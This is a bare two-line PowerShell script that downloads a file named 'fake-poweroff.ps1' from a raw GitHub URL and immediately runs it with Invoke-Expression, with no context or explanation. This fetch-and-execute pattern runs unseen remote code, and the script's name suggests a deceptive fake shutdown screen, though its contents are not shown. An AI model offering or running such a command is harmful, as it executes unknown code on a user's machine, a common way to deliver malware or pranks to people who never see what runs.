$url="https://raw.githubusercontent.com/Zhuss1/main/main/fake-poweroff.ps1"
Invoke-Expression (Invoke-WebRequest -UseBasicParsing $url).Content
